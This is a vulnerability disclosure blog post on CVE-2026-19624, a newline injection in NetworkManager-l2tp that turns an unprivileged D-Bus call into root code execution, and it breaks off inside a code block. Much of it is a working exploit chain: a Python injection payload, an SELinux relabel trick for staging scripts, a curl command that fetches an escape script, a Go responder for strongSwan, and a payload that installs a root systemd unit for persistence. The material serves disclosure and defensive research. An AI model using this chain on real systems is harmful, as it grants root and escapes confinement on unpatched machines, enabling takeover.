---
title: "A Newline to Root: CVE-2026-19624"
summary: "An unprivileged D-Bus call writes a root-parsed VPN config value. One newline, root code execution, confinement escape."
date: '2026-08-31T00:00:00Z'
subtitle: "Unconfined root from NetworkManager-l2tp via ipsec.conf injection"
tags: ["security", "offensive-security", "CVE-2026-19624", "selinux", "apparmor", "networkmanager", "nm-l2tp", "ipsec", "dbus", "polkit", "privilege-escalation", "linux", "exploit", "libreswan", "strongswan"]
channels: ["vuln-research"]
---

A single newline in a VPN field, submitted over D-Bus by any logged-in desktop user, becomes root code execution. The bug (CVE-2026-19624) is one missing check.

The interesting part is firing the exploit and escaping the MAC confinement you land in, which plays out differently across libreswan/strongSwan and SELinux/AppArmor. This turned into a comparison: same injection vulnerability, three completely different post-exploitation stories depending on your distro's IPsec daemon and MAC system.

| Distro | IPSec daemon | MAC | Landing |
| --- | --- | --- | --- |
| Fedora / RHEL      | libreswan  | `SELinux`  | ipsec_mgmt_t -> escape -> unconfined root with full caps |
| Ubuntu / Debian    | strongSwan | `AppArmor` | unconfined root -> escalate -> unconfined root with full caps |
| SUSE Leap / SLES   | strongSwan | `SELinux`  | ipsec_mgmt_t -> escape -> unconfined root with full caps |

## How I Got Here

I was auditing NetworkManager core (the root daemon itself) looking at its "trusted" surface (secret agents, async polkit windows, the connection-settings parser) to see if it shares patterns with other GLib daemons I had recently broken.

It didn't. NM 1.56 came back clean: 22 potential bugs, 0 confirmed in the end. Object lifetime across async authorization boundaries is handled correctly - activation holds a strong reference across the entire polkit await, deactivation re-resolves by path instead of caching a pointer, the settings-connection delete path cancels pending auths before freeing. It is a well-built daemon.

So I stopped auditing the daemon and started mapping where its attacker-controlled data goes. NetworkManager doesn't interpret `vpn.data` it's just an `a{ss}` dictionary that gets handed to whichever VPN plugin owns the service type. The plugins are separate packages, with separate maintainers, with no shared validation functions. Same input, different downstream parser per plugin, each with its own idea of what is valid, what needs escaping, and how to perform it.

In 2018 NetworkManager's vpnc plugin got [CVE-2018-10900](https://nvd.nist.gov/vuln/detail/CVE-2018-10900):

```text
A new line character can be used to inject a Password helper parameter into the configuration data passed to VPNC, allowing an attacker to execute arbitrary commands as root.
```

In 2024 NetworkManager's libreswan plugin got [CVE-2024-9050](https://access.redhat.com/security/cve/CVE-2024-9050):

```text
A flaw was found in the libreswan client plugin for NetworkManager (NetworkManager-libreswan), where it fails to properly sanitize the VPN configuration from the local unprivileged user. In this configuration, composed by a key-value format, the plugin fails to escape special characters, leading the application to interpret values as keys.
```

The l2tp plugin had a similar vulnerability, and now it gets CVE-2026-19624.

This is a writeup of the bug and the root execution the exploit produces, and escaping the MAC confinement of the SELinux domain or AppArmor profile you land in. There are many differences between the different distros and the ipsec daemons they use and the post-exploitation work. I found working paths from an unprivileged local user to unconfined root on each.

## Affected Systems

| | |
|-|-|
| **Package** | NetworkManager-l2tp (Fedora/RHEL/SUSE) / network-manager-l2tp (Debian/Ubuntu) |
| **Component** | `nm-l2tp-service`, the root D-Bus L2TP VPN service |
| **Affected** | every release before the fixed set below, on every stable branch: 1.0.x, 1.2.x, 1.8.x, 1.20.x, 1.52.x |
| **Required access** | unprivileged local user with a login session. no admin, no `wheel`, no password |
| **Result** | code execution as root, SELinux escape to unconfined |
| **Last Vulnerable** | 1.52.2, 1.20.22, 1.8.8, 1.2.20, 1.0.14 |
| **Fixed in** | 1.52.4, 1.20.24, 1.8.10, 1.2.22, 1.0.16, commit [95b6b46f](https://github.com/nm-l2tp/NetworkManager-l2tp/commit/95b6b46f48a0c9eabc79272cd313f219110ef91c) |

Audited on Fedora 44 with NetworkManager 1.56.1 and NetworkManager-l2tp 1.52.2 + libreswan, and confirmed against upstream HEAD at the time of reporting. Also tested the injection and SELinux work extensively against RHEL 10.

Tested against Ubuntu 26.04 LTS with strongSwan. AppArmor confinement escape and documentation of that in it's own section.

Also tested against openSUSE Leap 16 with strongSwan and SELinux, covered in its own section.

## The bug: two functions

`nm-l2tp-service` is the root helper NetworkManager runs for l2tp VPN connections. On activation it generates an IPsec configuration file at `/run/nm-l2tp-<uuid>/ipsec.conf` and runs the `ipsec` control client as root via `system()`, which passes the config to the running `pluto` (Libreswan) or `charon` (strongSwan) daemon to add. The paths vary slightly between RHEL/Fedora (Libreswan) and Debian/Ubuntu/SUSE (strongSwan). The plugin detects what daemon is in-use.

```c
sys = system("ipsec add '<uuid>' --config <rundir>/ipsec.conf --verbose")
```

Older versions run with `ipsec auto`. There are 2 functions that decide what ends up in that file - 1 validator and 1 writer.

The first is `validate_one_property()`, which is supposed to validate every `vpn.data` item. In [1.52.2](https://github.com/nm-l2tp/NetworkManager-l2tp/blob/21894a5ddca14b6d91f4fbd736c91d77d1f5bc7a/src/nm-l2tp-service.c#L408), this is what it checks:

```c
case G_TYPE_STRING:
    if (!strcmp(prop.name, NM_L2TP_KEY_GATEWAY)) {
        if (validate_gateway(value))
            return; /* valid */

        g_set_error(info->error, ..., _("invalid gateway '%s'"), value);
    }

    return;
```

Only the gateway gets a validation check. Every other string passes automatically which includes `ipsec-ike`, `ipsec-esp`, `ipsec-group-name`, `ipsec-remote-id`, the certificate paths, and the lifetimes.

The [write in 1.52.2](https://github.com/nm-l2tp/NetworkManager-l2tp/blob/21894a5ddca14b6d91f4fbd736c91d77d1f5bc7a/src/nm-l2tp-service.c#L627) comes from `write_config_option()`:

```c
static inline void
write_config_option(int fd, const char *format, ...)
{
    ...
    string = g_strdup_vprintf(format, args);
    x      = write(fd, string, strlen(string));
    ...
}
```

`printf` into a buffer then `write` the buffer. No escaping, no quoting, no line discipline. The caller supplies the format:

```c
value = nm_setting_vpn_get_data_item(s_vpn, NM_L2TP_KEY_IPSEC_IKE);
if (value) {
    write_config_option(fd, "  ike=%s\n", value);
}
```

Nothing between the D-Bus dictionary and the root-parsed config file rejects a newline. So a newline is a new config option passed to the ipsec daemon (Libreswan/strongSwan).

---

## Injection

The attack is all over unprivileged system D-Bus. Add a VPN connection you own with the injection, activate it.

The path from D-Bus call to ipsec.conf varies between Fedora/RHEL/SUSE and Debian/Ubuntu depending if `netplan` is involved and whether a persistent connection is added or not. Details are covered in their respective sections.

At a really high level:

```
our PoC        -> call D-Bus  -> org.freedesktop.NetworkManager
                                 AddAndActivateConnection2()

NetworkManager -> spawns      -> /usr/libexec/nm-l2tp-service
NetworkManager -> call D-Bus  -> the nm-l2tp helper: Connect / NeedSecrets
                                 (org.freedesktop.NetworkManager.VPN.Plugin iface)

nm-l2tp helper -> exec ipsec  -> talks to ipsec daemon control socket to add connection
                                 (this is what parses our NM config with the injection)
```

By using a python script like:

```python
X = "aes128-sha256-modp2048\n  leftupdown=\"/bin/sh /tmp/x.sh\"\n  rightikeport=5500"

data = {"gateway": GW, "user": "k", "password-flags": "0",
        "ipsec-enabled": "yes", "ipsec-ikev2": "yes", "ipsec-ike": X}

... (build con = vpn config)

NM = "org.freedesktop.NetworkManager"
mgr = dbus.Interface(bus.get_object(NM, "/org/freedesktop/NetworkManager"), NM)

ac = mgr.AddAndActivateConnection2(con, "/", "/", opts)
```

We make one system D-Bus call to the `AddAndActivateConnection2()` method of the `org.freedesktop.NetworkManager` interface and pass in the vpn configuration to NetworkManager. NetworkManager spawns the nm-l2tp helper that parses the configuration and uses a GLib function that does a `printf`, converting those `\n` into newlines, writes the ipsec config under `/run`, and tells the ipsec daemon to load the config.

This is what gets written to `/run/nm-l2tp-<uuid>/ipsec.conf`:

```ini
conn 232236cc-a1e0-4fe5-87ab-e2e1df80e121
  auto=add
  type=transport
  authby=secret
  left=127.0.0.1
  leftprotoport=udp/l2tp
  rightprotoport=udp/l2tp
  right=127.0.0.2
  rightid=%any
  ike=aes128-sha256-modp2048
  leftupdown="/bin/sh /tmp/x.sh"
  rightikeport=5500
  keyexchange=ikev2
```

`ipsec-ike` is one of several options. `ipsec-group-name` sets `leftid=`, `ipsec-remote-id` sets `rightid=`, and the same writer builds `xl2tpd`/`kl2tpd` and pppd options files. Those also have options that can be used to execute commands as root.

## From Injection to Root

Fedora/RHEL run Libreswan under SELinux for the ipsec daemon.

Ubuntu/Debian run strongSwan under AppArmor for the ipsec daemon.

SUSE runs strongSwan like Ubuntu/Debian, but it runs SELinux for MAC like Fedora/RHEL. A mix of the other distros.

`leftupdown` is a command the ipsec daemon runs when a connection changes state. It runs as root. There are 5 events that can fire that command: (`prepare-host`, `route-host`, `up-host`, `down-host`, `unroute-host`). `Libreswan` fires even against a dead/non-existent peer but `strongSwan` only fires on a live CHILD_SA.

## Session Requirements

NetworkManager does not run its own control socket, the system bus is the interface. This is what `nmcli` and display manager settings panels use. Polkit provides the authentication and authorization checks, and for this vulnerability there are two actions we use. Any local logind session (active or inactive) passes both with no prompt, remote/sessionless callers (SSH, su -l, sudo -u) hit allow_any, where network-control's auth_admin denies them.

| action | allow_active | allow_inactive | allow_any |
| --- | --- | --- | --- |
| settings.modify.own (AddConnection)  | yes | yes | auth_self_keep |
| network-control (ActivateConnection) | yes | yes | auth_admin |

Run `nmcli general permissions` over SSH and you'll see `auth` next to both actions but if you run it in a desktop/local login session you'll see `yes`.

Checked on Fedora 44 and Ubuntu 26.04 LTS and both had same defaults.

So: a logged-in local user, no password prompt, no administrative rights. The classic desktop LPE threat model.

The rest of the article will cover the separate exploits for each, and the paths to escaping their MAC confinement. The split on exploitation is really which IPsec daemon is installed, not the distro. I'll refer to distros throughout the article since most people will be running the default package.

## Fedora/RHEL + SELinux

Fedora, RHEL and now SUSE run SELinux in enforcing mode by default. Like most of my exploits lately, SELinux greatly constrains what I can do after gaining execution and does not play much of a role pre-exploitation.

This post will use a full `SELinux=enforcing` system and a `user_u` confined user.

Fedora/RHEL with Libreswan use `pluto` as the ipsec daemon. It runs as `ipsec_t`.

### Exploitation

`pluto` is convenient because it runs the `unroute-host` action that fires on teardown intentionally, even on a dead/nonexistent peer to notify scripts that a connection failed. So we don't need a real responder/peer.

When pluto runs our `leftupdown` payload, it does `execve("/bin/sh", ["sh", "-c", cmd, NULL])`. `/bin/sh` symlinks to bash which is labeled `shell_exec_t` which has the `base_ro_file_type` attribute and ipsec_t has `base_ro_file_type:file exec` as well as a transition to `ipsec_mgmt_t` when executing `shell_exec_t`. So everything we execute will be from the `ipsec_mgmt_t` type.

```bash
$ ls -Z /usr/bin/bash
system_u:object_r:shell_exec_t:s0 /usr/bin/bash

$ sesearch -A -s ipsec_t -t shell_exec_t -c file -p open,read,execute -eb
allow domain base_ro_file_type:file { getattr ioctl lock open read };
allow ipsec_t base_ro_file_type:file { execute execute_no_trans map };

$ sesearch -T -s ipsec_t -t shell_exec_t -c process
type_transition ipsec_t shell_exec_t:process ipsec_mgmt_t;
```

### Staging payload

You don't actually need to share a script for this exploit, you can in-line the script into the config at injection.

When testing this on Fedora 44 on the exploitation side, the first attempt was a script in `/dev/shm` which was blocked. `ipsec_mgmt_t` can read but not open or execute `user_tmp_t`.

```
avc: denied { open } ... scontext=system_u:system_r:ipsec_mgmt_t:s0 tcontext=user_u:object_r:user_tmp_t:s0
```

```bash
$ sesearch -A -s ipsec_mgmt_t -t user_tmp_t -c file -p open,read
allow domain tmpfile:file { append getattr ioctl lock read };
```

So I went looking through all the attributes each carry and comparing the crossover of what `user_t` can write/relabel that `ipsec_mgmt_t` can read and I found one single match `container_file_t`. ipsec_mgmt_t carries grants that allow it to read files/directories with the `logfile` attribute (~200 log types) and write to its own ipsec_log_t type. A confined user cannot normally write to any types that carry the `logfile` attribute.

`container_file_t` comes from the `container-selinux` package. It is installed by default on my test Fedora 44 workstation and container-enabled server installs including my RHEL9 and RHEL10 test system, and absent on minimal/container-less installs including my RHEL9 workstation.

The `container-selinux` package tags `container_file_t` as `logfile` along with adding three real log types (container_log_t, passt_log_t, pasta_log_t). The last three are log file labels, `container_file_t` is used for rw storage volumes. A `user_u` user can place files in /tmp or /dev/shm and then `chcon -t container_file_t /tmp/x` and it provides a very portable way of sharing files from `user_u` to a daemon.

The attributes of container_file_t contain logfile:

```bash
$ seinfo -t container_file_t -a logfile

Types: 1
   container_file_t

Type Attributes: 1
   logfile
```

A normal `user_u` operating as type `user_t` can open/write to container_file_t:

```bash
$ sesearch -A -s user_t -t container_file_t -c file -p open,read -dt -eb
allow userdomain container_file_t:file { append create getattr ioctl link lock open read rename setattr unlink watch watch_reads write };
```

And importantly can also relabel to it. In this case because container_file_t also carries the user_home_type attribute that users can relabel to:

```bash
$ sesearch -A -s user_t -t container_file_t -c file -p relabelto
allow user_t user_home_type:file { append create getattr ioctl link lock open read relabelfrom relabelto rename setattr unlink watch watch_reads write };

$ seinfo -a user_home_type -t container_file_t

Types: 1
   container_file_t

Type Attributes: 1
   user_home_type
```

`ipsec_mgmt_t` can open/read it through the logfile grant since container-selinux has added the logfile attribute to container_file_t:

```bash
$ sesearch -A -s ipsec_mgmt_t -t container_file_t -c file -p open,read -eb
allow ipsec_mgmt_t logfile:file { map open read };
```

Now if we fire the exploit again, we get past the open but get denied exec on `container_file_t`:

```
avc: denied { execute } ... scontext=system_u:system_r:ipsec_mgmt_t:s0 tcontext=user_u:object_r:container_file_t:s0
```

We are allowed to execute bash and we are allowed to read our staged payload. So we can just have bash `open` our script and it will execute it for us, and works around needing exec on the script itself. So change the `leftupdown` payload to "/bin/sh /tmp/x.sh" and we `exec` sh and `open` our payload and everything fires.

As a `user_u` confined user, to stage a payload script:

```bash
$ id
uid=1003(k) gid=1003(k) groups=1003(k) context=user_u:user_r:user_t:s0

$ id -Z
user_u:user_r:user_t:s0

$ cat > /tmp/x.sh << EOF
#!/bin/sh
{ id; cat /proc/self/status; } > /tmp/ipsec-out.txt
EOF

$ chcon -t container_file_t /tmp/x.sh

$ ls -Z /tmp/x.sh
user_u:object_r:container_file_t:s0 /tmp/x.sh
```

This is a simple example for this post to print id and status to a /tmp file.

If you are on a system with this, it is convenient to be able to execute a longer script, and it was interesting to research. But if you are on a system that can't use the trick described here, just in-line your payload like `sh -c 'id'` instead of running `sh /tmp/x.sh`.

### Post-Exploitation

pluto (`ipsec_t`) execs the shell for `leftupdown` and transitions to `ipsec_mgmt_t`, same as shown above staging the exploit. After the exploit fires, check our output file:

```bash
$ cat /tmp/ipsec-out.txt
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:ipsec_mgmt_t:s0
...
CapPrm: 0000000000003104
CapEff: 0000000000003104
CapBnd: 0000000000003104
```

Root, but confined to `system_u:system_r:ipsec_mgmt_t` and with pretty limited capabilities:

```bash
$ capsh --decode="3104"
0x0000000000003104=cap_dac_read_search,cap_setpcap,cap_net_admin,cap_net_raw
```

Not the most powerful capabilities and SELinux will prevent us from using them for most of the things they would enable like reading /etc/shadow, etc.

The ipsec.service unit does not have any hardening applied by systemd. It manages its own capabilities, check the running pluto process capabilities and it has:

```bash
$ grep ^Cap /proc/$(pgrep pluto)/status
CapInh: 0000000000000000
CapPrm: 00000000200074c4
CapEff: 00000000200074c4
CapBnd: 0000000000003104
CapAmb: 0000000000000000
```

At startup it lowers its own Permitted/Effective capabilities and separately sets an even more restricted Bounding set so child processes like our `leftupdown` payload get the smaller set of capabilities.

### Escape to unconfined

I have a full post documenting SELinux+systemd escape methods at [confined root is still root](/posts/confined-root-is-still-root), refer to the tested versions section to see which techniques apply to your distro. For `ipsec_mgmt_t` all the following escape techniques work:

- [PackageKit](https://linnemanlabs.com/posts/confined-root-is-still-root/#packagekit)
- [KDE Helpers](https://linnemanlabs.com/posts/confined-root-is-still-root/#19-kde-entry-points) on KDE systems
- [Blivet](https://linnemanlabs.com/posts/confined-root-is-still-root/#blivet) on Fedora systems
- [Udisks2](https://linnemanlabs.com/posts/confined-root-is-still-root/#udisks2)
- [systemd activation pull](https://linnemanlabs.com/posts/confined-root-is-still-root/#want-link-enable)
- [sysext Overlay](https://linnemanlabs.com/posts/confined-root-is-still-root/#sysext-overlay)

Six paths to unconfined, pick your favorite that applies to your distro.

Just swap out the payload you point to in `nm-l2tp-inject.py` for one of the SELinux escapes I covered above. I will use the [systemd activation pull](https://linnemanlabs.com/posts/confined-root-is-still-root/#want-link-enable) technique here, it is simple and clean and portable since it is part of systemd itself.

Place [activation-pull.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/activation-pull.sh) at the path you point to as your `leftupdown` payload in `nm-l2tp-inject.py`. 

Run the injection again:

```bash
$ id
uid=1003(k) gid=1003(k) groups=1003(k) context=user_u:user_r:user_t:s0

$ curl -s -o "/tmp/x.sh" "https://raw.githubusercontent.com/linnemanlabs/advisories/refs/heads/main/poc/selinux/confined-root-is-still-root/activation-pull.sh"

$ chcon -t container_file_t /tmp/x.sh

$ python3 nm-l2tp-inject.py 
[+] connection added:     /org/freedesktop/NetworkManager/Settings/48
[+] connection activated: /org/freedesktop/NetworkManager/ActiveConnection/48
[*] uuid: f8b462d6-b8f4-4288-97e8-515416ddc696
```

Check /tmp for the SELinux escape output:

```bash
$ ls /tmp/service.out-*
/tmp/service.out-178791076114446

$ cat /tmp/service.out-178791076114446
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
CapInh: 0000000000000000
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
```

Unconfined root with full caps.

### NM -> l2tp -> ipsec

If you don't care how your D-Bus calls and NetworkManager actually reach pluto, skip this section it doesn't change the exploit. If you want to see the full chain, here's every transition and grant.

`nm-l2tp` is a plugin which means it is started by NetworkManager not by systemd directly. The path from our D-Bus calls to our payload firing using the volatile path roughly goes:

```
our PoC        -> call D-Bus  -> org.freedesktop.NetworkManager
                                 AddAndActivateConnection2()

NetworkManager -> spawns      -> /usr/libexec/nm-l2tp-service
NetworkManager -> call D-Bus  -> the l2tp helper: Connect / NeedSecrets
                                 (org.freedesktop.NetworkManager.VPN.Plugin iface)

l2tp helper    -> exec ipsec  -> talks to ipsec.service (pluto) control socket to add connection
                                 (this is what parses our NM config with the injection)

ipsec (pluto)  -> vpn connect -> tries to reach peer, fires leftupdown as root 
```

NetworkManager runs the l2tpd helper and transitions l2tpd_exec_t -> l2tpd_t.

```bash
$ ls -Z /usr/libexec/nm-l2tp-service
system_u:object_r:l2tpd_exec_t:s0 /usr/libexec/nm-l2tp-service

$ sesearch -A -s NetworkManager_t -t l2tpd_exec_t -c file -p open,read,execute -eb
allow NetworkManager_t l2tpd_exec_t:file { execute getattr ioctl map open read };

$ sesearch -T -s NetworkManager_t -t l2tpd_exec_t
type_transition NetworkManager_t l2tpd_exec_t:process l2tpd_t;
```

nm-l2tp reaches the ipsec control socket at `/run/pluto/pluto.ctl` which is labeled `ipsec_var_run_t`. To do that it runs `ipsec` which is labeled `ipsec_mgmt_exec_t` which transitions to `ipsec_mgmt_t`:

```bash
$ sudo ls -Z /run/pluto/pluto.ctl
system_u:object_r:ipsec_var_run_t:s0 /run/pluto/pluto.ctl

$ ls -Z `which ipsec`
system_u:object_r:ipsec_mgmt_exec_t:s0 /usr/sbin/ipsec

$ sesearch -A -s l2tpd_t -t ipsec_mgmt_exec_t -dt
allow l2tpd_t ipsec_mgmt_exec_t:file { execute getattr ioctl map open read };

$ sesearch -T -s l2tpd_t -t ipsec_mgmt_exec_t
type_transition l2tpd_t ipsec_mgmt_exec_t:process ipsec_mgmt_t;
```

Now that it is `ipsec_mgmt_t` it has the sock_file and unix_stream_socket grants required to talk to the socket:

```bash
$ sesearch -A -s ipsec_mgmt_t -t ipsec_var_run_t -c sock_file -p write
allow ipsec_mgmt_t ipsec_var_run_t:sock_file { append create getattr ioctl link lock open read rename setattr unlink write };

$ sesearch -A -s ipsec_mgmt_t -t ipsec_t -c unix_stream_socket -p connectto
allow ipsec_mgmt_t ipsec_t:unix_stream_socket { connectto read write };
```

Now that it can talk to the socket, it can drive pluto to load the injected config.

## Ubuntu/Debian + AppArmor

Everything above was Fedora/RHEL, libreswan, SELinux. Ubuntu and Debian run `strongSwan` under `AppArmor` and the differences went a lot deeper than I expected.

### netplan Interruption

My first surprise when testing my original persistent path that used `AddConnection` was that my exploit didn't fire. Same `AddConnection`, same injected `ipsec-ike`, but strongSwan rejected the generated config:

```
ipsec_starter[61654]: /run/nm-l2tp-548dbce3-945c-410a-a562-6e4229b8dae7/ipsec.conf:11: syntax error, unexpected EQ
ipsec_starter[61654]: invalid config file '/run/nm-l2tp-548dbce3-945c-410a-a562-6e4229b8dae7/ipsec.conf'
```

Looking at the generated ipsec.conf:

```bash
$ sudo cat /run/nm-l2tp-548dbce3-945c-410a-a562-6e4229b8dae7/ipsec.conf
config setup
conn 548dbce3-945c-410a-a562-6e4229b8dae7
  auto=add
  type=transport
  authby=secret
  left=127.0.0.1
  leftprotoport=udp/l2tp
  rightprotoport=udp/l2tp
  right=127.0.0.2
  rightid=%any
  ike=aes128-sha256-modp2048\n  leftupdown="/bin/sh /tmp/x.sh"\n  rightikeport=5500
  keyexchange=ikev2

```

Our injection got printed into the ipsec config with \n instead of being parsed into newlines. On Fedora/RHEL/SUSE, NetworkManager writes the connection directly to a configuration file and reads it back. On Ubuntu, NetworkManager integrates `netplan` so `AddConnection` writes a netplan YAML configuration file, then `netplan generate` produces the nmconnection file that NetworkManager loads.

The netplan YAML looks like this:

```bash
$ sudo grep -ike /etc/netplan/90-NM-548dbce3-945c-410a-a562-6e4229b8dae7.yaml
    vpn.ipsec-ike: "aes128-sha256-modp2048\n  leftupdown=\"/bin/sh /tmp/x.sh\"\n
\ rightikeport=5500"
```

When `netplan generate` reads that config, the nmconnection it writes for NetworkManager looks like this:

```bash
$ sudo grep ipsec-ike /run/NetworkManager/system-connections/netplan-NM-548dbce3-945c-410a-a562-6e4229b8dae7.nmconnection
ipsec-ike=aes128-sha256-modp2048\\n  leftupdown="/bin/sh /tmp/x.sh"\\n  rightikeport=5500
```

netplan runs every value through g_strescape which turns our newline into `\n`, and then GKeyFile escaping turns that into `\\n`. When NetworkManager reads that config later, it turns that into `\n` and hands it to the l2tp helper which prints it into ipsec.conf, which strongSwan rejects when it hits the invalid line.

netplan is an accidental, partial fix that breaks the persistent path. But there are two other paths that don't involve netplan. Instead of adding then activating the connection in two separate steps, we can use the `AddAndActivateConnection2` method that does both at once, and bypasses netplan entirely.

So I use the `AddAndActivateConnection2` method, with `persist=volatile` or `memory` it never uses the persistent path that involves netplan, so NetworkManager hands the plugin the injection with the newline intact.

| Value | Netplan | Effect |
|---|---|---|
| volatile | No | writes to `/run/`, no escaping, deletes the connection on de-activation |
| memory | No | writes to `/run/`, no escaping |
| disk | Yes | writes to `/etc/`, control-characters get double-escaped |

By changing the PoC to use this method and setting `persist=` to `memory` or `volatile` we get this in the generated ipsec.conf:

```bash
$ sudo cat /run/nm-l2tp-1967d3d4-58a3-483c-a338-df1482f9da6f/ipsec.conf
config setup
conn 1967d3d4-58a3-483c-a338-df1482f9da6f
  auto=add
  type=transport
  authby=secret
  left=127.0.0.1
  leftprotoport=udp/l2tp
  rightprotoport=udp/l2tp
  right=127.0.0.2
  rightid=%any
  ike=aes128-sha256-modp2048
  leftupdown="/bin/sh /tmp/x.sh"
  rightikeport=5500
  keyexchange=ikev2
```

Back to the config we want with our injected lines. So on Ubuntu the PoC uses the `persist=volatile` approach.

### strongSwan Differences

This is where strongswan and libreswan differ quite a bit.

Running the PoC that uses a dead peer and also using our loopback trick to treat a local ip as remote results in these logs:

```
NetworkManager[72609]: sending packet: from 127.0.0.1[4500] to 127.0.0.2[4500] (1208 bytes)
NetworkManager[72609]: received packet: from 127.0.0.2[4500] to 127.0.0.1[4500] (36 bytes)
NetworkManager[72609]: parsed IKE_SA_INIT response 0 [ N(NO_PROP) ]
NetworkManager[72609]: received NO_PROPOSAL_CHOSEN notify error
NetworkManager[72609]: establishing connection '8d2215b7-9776-43e0-a453-bb4c231faf7f' failed
NetworkManager[72616]: Stopping strongSwan IPsec...
charon[72559]: 00[DMN] SIGINT received, shutting down
ipsec_starter[72558]: child 72559 (charon) has quit (exit code 0)
NetworkManager[5515]: <warn>  [1788272210.6193] vpn[0x5be1dfe56a80,8d2215b7-9776-43e0-a453-bb4c231faf7f,"linnemanlabs-poc"]: failed to connect: 'Could not establish IPsec connection.'
```

Several interesting things going on here. First, charon does not fire `leftupdown` on failed connections, only on `up-host` and `down-host`. So we need a real responder to establish a real SA before our `leftupdown` payload will fire.

Second, notice that strongswan sent the traffic to `127.0.0.2:4500` but we specified `rightikeport=5500`, more on that later.

It also logged lines for both `sending packet` and then `received packet`. The loopback trick worked for it to treat it as a remote peer, but charon ended up being both the sender and the receiver and replying to its own traffic. By default it listens on `0.0.0.0` and so 127.0.0.2 is included, and since it re-wrote our right side port to `4500` which it is also listening on, it connected to itself.

I thought I could take advantage of that, and have it establish a 'real' connection with itself by using identical auth on both sides. It almost works, it does establish the connection, but both sides try to install the SA to the kernel, and when the duplicate fails, the connection is torn down:

```
07[IKE] establishing CHILD_SA ...{1}
08[CFG] selected peer config 'selfresp'
08[IKE] authentication of '127.0.0.1' ... successful
08[IKE] IKE_SA selfresp[2] established between 127.0.0.2...127.0.0.1
08[CFG] selected proposal: ESP:AES_CBC_128/HMAC_SHA2_256_128/NO_EXT_SEQ
08[KNL] unable to add SAD entry with SPI c2d98fd8 (ALREADY_DONE)
08[IKE] unable to install outbound IPsec SA (SAD) in kernel
08[IKE] failed to establish CHILD_SA, keeping IKE_SA
```

Even that isn't enough to trigger a `leftupdown` execution under strongswan. One step short. So we need a real peer.

### Exploitation

And that's where it gets fun and I will provide two paths. Both work entirely from an unprivileged user. The practical route is a userspace responder (I made a Go version) that won't try to install the SA to the kernel and avoids the duplicate issue. Or you can go on a namespace adventure and keep it self-contained by running a second strongswan in a network namespace so the kernel SAs do not conflict. I will cover both.

#### Userspace Responder

As an unprivileged user we can run our own responder on a high port. But strongswan is forcing our right side port to `:4500`. We cannot claim that port or when strongswan itself starts it will complain and abort:

```
00[NET] unable to bind socket: Address already in use
00[NET] could not open IPv4 NAT-T socket
```

During initial IKE negotiation over port 500 strongswan checks it is reaching the peer over NAT. To keep the rabbit hole simple, strongswan's idea of its local IP is 0.0.0.0 and that is not the address the peer receives traffic from. So it decides NAT is detected (even on this loopback connection), move the rest of the traffic to encapsulated NAT-T sending from port 4500.

strongswan has a `float_ports` function. At a high level its logic is:

```
if (other_host->port == 500 || my_host->port == 500)
    other_host->set_port(4500);
if (my_host->port == charon->socket->get_port(...,FALSE))
    my_host->set_port(4500);
```

So it rewrites the remote port to 4500 if either port is 500, and rewrites the local port to 4500 if the local port equals the default IKE port (500).

But we have newline injection, so we can configure the left-side port and bypass this. strongswan only binds to two ports `:500` and `:4500`, and as shown `float_ports` rewrites if the left-side port is 500. If we change our injection to add `leftikeport=4500\n rightikeport=5500\n` then no conditions match for the re-write now.

It sees the left-side port moved to 4500, no port re-writes, our rightikeport= is applied. Now we need a responder.

I wrote a [minimal responder in go](https://github.com/linnemanlabs/advisories/blob/main/poc/nm-l2tp/nm-l2tp-responder.go) that will negotiate the connection:

```bash
$ go run nm-l2tp-responder.go 
[*] nm-l2tp-responder listening on :5500 psk="linnemanlabs-poc" id=127.0.0.2
```

Stage a payload script at /tmp/x.sh:

```bash
$ id
uid=1002(k2) gid=1002(k2) groups=1002(k2),100(users)

$ cat > /tmp/x.sh << 'EOF'
#!/bin/sh
{ id; cat /proc/$$/attr/current; cat /proc/$$/status; } > /tmp/ipsec-out.txt
EOF
```

Fire the PoC with `leftikeport=4500` and the traffic reaches our responder:

```
[*] INIT: SPIi=0198c981b4140225 -> responded (SPIr=f8cf267e9b4a563d)
[*] AUTH: initiator PSK verified OK
[+] AUTH: responded - charon should install SA and fire leftupdown
```

If we check /tmp/ipsec-out.txt:

```bash
$ head -1 /tmp/ipsec-out.txt
uid=0(root) gid=0(root) groups=0(root)
```

Our injection carried through, charon established the full connection, our `leftupdown` script fired as root on `up-host`. On to post-exploitation work.

#### Self-Contained

The above userspace responder route is objectively the simplest and cleanest. But maybe you don't want to or can't run the go binary on your target? Maybe this is on a tightly controlled air-gapped system you can't place binaries on. Or maybe you just want to see if you can.

You can, fully-unprivileged and binary-free. Run a second strongSwan in an unprivileged netns so its kernel SAs don't collide and relay IKE over a UNIX socket since they are in the same mnt namespace. The namespace setup uses the `aa-exec -p crun` userns trick from [Two Hops and a Shell on Ubuntu](/posts/two-hops-and-a-shell/) to get a uid0-mapped user namespace. More work than the Go responder and Ubuntu might decide to close the profile switch eventually. To keep this article focused I won't walk the whole thing here.

### Post-Exploitation

We have root exec, but what caps and what AppArmor confinement? If we read the rest of the /tmp/ipsec-out.txt file from when we fired the exploit earlier:

```bash
$ cat /tmp/ipsec-out.txt
uid=0(root) gid=0(root) groups=0(root)
unconfined
...
CapPrm: 00000000200534e2
CapEff: 00000000200534e2
CapBnd: 00000000200534e2
```

Turns out we are unconfined already, and with the following caps:

```bash
$ capsh --decode="00000000200534e2"
0x00000000200534e2=cap_dac_override,cap_kill,cap_setgid,cap_setuid,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_audit_write
```

More caps than we get from libreswan and a lot easier to get value from them here than the SELinux systems.

From unconfined root on an AppArmor system post-exploitation is trivial. Two simple examples: drop a cron job or a systemd unit file and get full caps.

To drop a systemd unit file, just change the /tmp/x.sh payload:

```bash
$ cat > /tmp/x.sh <<'EOF'
#!/bin/bash

cat > /etc/systemd/system/linnemanlabs-l2tp-poc.service <<'EOF2'
[Unit]
Description=LinnemanLabs l2tp POC

[Service]
ExecStart=/bin/sh -c "{ id; cat /proc/self/attr/current; cat /proc/self/status; } > /tmp/ipsec-out2.txt"
Type=oneshot
Restart=never
EOF2

systemctl daemon-reload
systemctl start linnemanlabs-l2tp-poc
EOF
```

Make sure the responder is still running, fire the exploit again:

```bash
